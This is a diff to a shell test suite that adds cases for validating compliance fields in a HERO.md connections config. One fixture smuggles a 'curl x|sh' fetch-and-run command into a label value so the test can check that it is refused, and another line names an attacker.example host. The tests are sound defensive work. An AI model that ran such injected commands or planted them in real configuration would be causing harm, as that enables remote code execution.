@@ -499,6 +499,28 @@ printf '# H\n\n## Connections\n\n### issues\n\n- type: github\n- at: acme/web\n-
 check "connection: a compliance-reach carrying a command is refused" \
   "2" "$(hero_connection issues compliance-reach "$FL/app" >/dev/null 2>&1; echo $?)"
 printf '# H\n\n## Connections\n\n### issues\n\n- type: github\n- at: acme/web\n- compliance-reach: linear\n' > "$FL/app/HERO.md"
+printf '# H\n\n## Connections\n\n### issues\n\n- type: linear\n- at: acme\n- compliance-label: Security$(curl x|sh)\n' > "$FL/app/HERO.md"
+check "connection: a compliance-label carrying a command is refused" \
+  "2" "$(hero_connection issues compliance-label "$FL/app" >/dev/null 2>&1; echo $?)"
+printf '# H\n\n## Connections\n\n### issues\n\n- type: linear\n- at: acme\n- compliance-team: Company "x"\n' > "$FL/app/HERO.md"
+check "connection: a compliance-team carrying a quote is refused" \
+  "2" "$(hero_connection issues compliance-team "$FL/app" >/dev/null 2>&1; echo $?)"
+printf '# H\n\n## Connections\n\n### issues\n\n- type: linear\n- at: acme\n- compliance-project: Product Security\n' > "$FL/app/HERO.md"
+check "connection: a plain compliance-project with a space is read" \
+  "Product Security" "$(hero_connection issues compliance-project "$FL/app" 2>/dev/null)"
+printf '# H\n\n## Connections\n\n### issues\n\n- type: github\n- at: acme/web\n- compliance-team: Company\n' > "$FL/app/HERO.md"
+check "connection: a team on a github route is refused" \
+  "2" "$(hero_connection issues compliance-team "$FL/app" >/dev/null 2>&1; echo $?)"
+printf '# H\n\n## Connections\n\n### issues\n\n- type: github\n- at: acme/web\n- compliance-type: linear\n- compliance-team: Company\n' > "$FL/app/HERO.md"
+check "connection: a team on a linear route under github main is read" \
+  "Company" "$(hero_connection issues compliance-team "$FL/app" 2>/dev/null)"
+printf '# H\n\n## Connections\n\n### issues\n\n- type: linear\n- at: acme\n- compliance-type: github\n' > "$FL/app/HERO.md"
+check "connection: a github route under a non-github main type is refused" \
+  "2" "$(hero_connection issues compliance-type "$FL/app" >/dev/null 2>&1; echo $?)"
+printf '# H\n\n## Connections\n\n### issues\n\n- type: linear\n- at: acme\n- compliance-type: jira\n' > "$FL/app/HERO.md"
+check "connection: compliance-type outside the closed list is refused" \
+  "2" "$(hero_connection issues compliance-type "$FL/app" >/dev/null 2>&1; echo $?)"
+printf '# H\n\n## Connections\n\n### issues\n\n- type: github\n- at: acme/web\n- compliance-reach: linear\n' > "$FL/app/HERO.md"
 check "connection: a plain compliance-reach is read" \
   "linear" "$(hero_connection issues compliance-reach "$FL/app" 2>/dev/null)"
 printf '# H\n\n## Connections\n\n### issues\n\n- type: github\n- at: ghe.attacker.example/owner/repo\n' > "$FL/app/HERO.md"
